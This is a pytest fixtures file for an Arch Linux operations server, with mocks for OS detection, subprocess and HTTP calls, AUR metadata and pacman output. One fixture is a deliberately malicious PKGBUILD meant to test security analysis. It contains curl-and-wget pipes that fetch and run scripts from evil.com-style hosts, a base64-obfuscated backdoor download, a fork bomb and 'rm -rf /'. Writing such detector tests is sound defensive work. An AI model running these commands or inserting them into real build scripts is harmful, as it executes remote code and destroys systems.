# SPDX-License-Identifier: GPL-3.0-only OR MIT
"""
Pytest configuration and shared fixtures for arch-ops-server tests.
"""

import asyncio
from pathlib import Path
from typing import AsyncGenerator
from unittest.mock import AsyncMock, MagicMock, patch

import httpx
import pytest


@pytest.fixture
def mock_arch_release(tmp_path: Path) -> Path:
    """Create a temporary /etc/arch-release file."""
    arch_release = tmp_path / "arch-release"
    arch_release.write_text("")
    return arch_release


@pytest.fixture
def mock_os_release_arch(tmp_path: Path) -> Path:
    """Create a temporary /etc/os-release file for Arch Linux."""
    os_release = tmp_path / "os-release"
    os_release.write_text(
        'NAME="Arch Linux"\n'
        'PRETTY_NAME="Arch Linux"\n'
        'ID=arch\n'
        'BUILD_ID=rolling\n'
        'ANSI_COLOR="38;2;23;147;209"\n'
    )
    return os_release


@pytest.fixture
def mock_os_release_ubuntu(tmp_path: Path) -> Path:
    """Create a temporary /etc/os-release file for Ubuntu."""
    os_release = tmp_path / "os-release"
    os_release.write_text(
        'NAME="Ubuntu"\n'
        'VERSION="22.04 LTS (Jammy Jellyfish)"\n'
        'ID=ubuntu\n'
        'ID_LIKE=debian\n'
    )
    return os_release


@pytest.fixture
def mock_subprocess_success():
    """Mock successful subprocess execution."""
    async def _mock_communicate():
        return (b"success output", b"")

    mock_process = MagicMock()
    mock_process.returncode = 0
    mock_process.communicate = _mock_communicate

    async def _create_subprocess(*args, **kwargs):
        return mock_process

    return _create_subprocess


@pytest.fixture
def mock_subprocess_failure():
    """Mock failed subprocess execution."""
    async def _mock_communicate():
        return (b"", b"error output")

    mock_process = MagicMock()
    mock_process.returncode = 1
    mock_process.communicate = _mock_communicate

    async def _create_subprocess(*args, **kwargs):
        return mock_process

    return _create_subprocess


@pytest.fixture
async def mock_httpx_client() -> AsyncGenerator[httpx.AsyncClient, None]:
    """Provide a mock httpx AsyncClient for testing HTTP requests."""
    async with httpx.AsyncClient() as client:
        yield client


@pytest.fixture
def mock_httpx_response():
    """Create a mock HTTP response factory."""
    def _create_response(
        status_code: int = 200,
        json_data: dict = None,
        text_data: str = None,
        headers: dict = None
    ) -> MagicMock:
        """Create a mock HTTP response with specified attributes."""
        response = MagicMock()
        response.status_code = status_code
        response.headers = headers or {}

        if json_data is not None:
            response.json = MagicMock(return_value=json_data)

        if text_data is not None:
            response.text = text_data

        response.raise_for_status = MagicMock()
        if status_code >= 400:
            response.raise_for_status.side_effect = httpx.HTTPStatusError(
                f"HTTP {status_code}",
                request=MagicMock(),
                response=response
            )

        return response

    return _create_response


@pytest.fixture
def sample_aur_package():
    """Sample AUR package metadata for testing."""
    import time
    recent_time = int(time.time()) - 86400 * 7  # 7 days ago
    return {
        "ID": 123456,
        "Name": "test-package",
        "PackageBaseID": 123456,
        "PackageBase": "test-package",
        "Version": "1.0.0-1",
        "Description": "A test package",
        "URL": "https://example.com",
        "NumVotes": 42,
        "Popularity": 0.5,
        "OutOfDate": None,
        "Maintainer": "testuser",
        "FirstSubmitted": 1640000000,
        "LastModified": recent_time,  # Recently updated
        "URLPath": "/cgit/aur.git/snapshot/test-package.tar.gz",
        "Depends": ["python"],
        "MakeDepends": ["gcc"],
        "License": ["MIT"],
        "Keywords": ["test", "example"]
    }


@pytest.fixture
def sample_pkgbuild_safe():
    """Sample safe PKGBUILD for testing."""
    return """# Maintainer: Test User <test@example.com>
pkgname=test-package
pkgver=1.0.0
pkgrel=1
pkgdesc="A safe test package"
arch=('x86_64')
url="https://example.com"
license=('MIT')
depends=('python')
source=("https://example.com/source.tar.gz")
sha256sums=('abc123...')

build() {
    cd "$srcdir/$pkgname-$pkgver"
    make
}

package() {
    cd "$srcdir/$pkgname-$pkgver"
    make DESTDIR="$pkgdir/" install
}
"""


@pytest.fixture
def sample_pkgbuild_dangerous():
    """Sample dangerous PKGBUILD for testing security analysis."""
    return """# Suspicious PKGBUILD
pkgname=malicious-package
pkgver=1.0.0
pkgrel=1

build() {
    # Download and execute arbitrary code
    curl https://evil.com/malware.sh | sh

    # Try to mine cryptocurrency
    wget -O - https://pool.com/miner | bash

    # Fork bomb
    :(){ :|:& };:

    # Obfuscated code
    eval "$(echo Y3VybCBodHRwOi8vZXZpbC5jb20vYmFja2Rvb3Iuc2g= | base64 -d)"
}

package() {
    # Try to modify system files
    rm -rf /
}
"""


@pytest.fixture
def sample_wiki_search_results():
    """Sample Arch Wiki search results for testing."""
    return {
        "query": {
            "search": [
                {
                    "ns": 0,
                    "title": "Installation guide",
                    "snippet": "This document is a guide for installing <span>Arch Linux</span>...",
                },
                {
                    "ns": 0,
                    "title": "Pacman",
                    "snippet": "The <span>pacman</span> package manager is one of the major...",
                }
            ]
        }
    }


@pytest.fixture
def sample_pacman_info():
    """Sample pacman package info output."""
    return """Name            : vim
Version         : 9.0.1000-1
Description     : Vi Improved, a highly configurable, improved version of the vi text editor
Architecture    : x86_64
URL             : https://www.vim.org
Licenses        : custom:vim
Groups          : None
Provides        : xxd  vim-minimal  vim-python3
Depends On      : vim-runtime=9.0.1000-1  gpm  acl  glibc  libgcrypt  pcre2  zlib
Optional Deps   : python: Python language support
                  ruby: Ruby language support
Required By     : None
Optional For    : None
Conflicts With  : gvim  vim-minimal  vim-python3
Replaces        : vim-minimal  vim-python3
Installed Size  : 3.50 MiB
Packager        : Arch Linux ARM Build System <builder+n1@archlinuxarm.org>
Build Date      : Mon 01 Jan 2024 12:00:00 PM UTC
Install Date    : Tue 02 Jan 2024 10:30:00 AM UTC
Install Reason  : Explicitly installed
Install Script  : Yes
Validated By    : Signature
"""
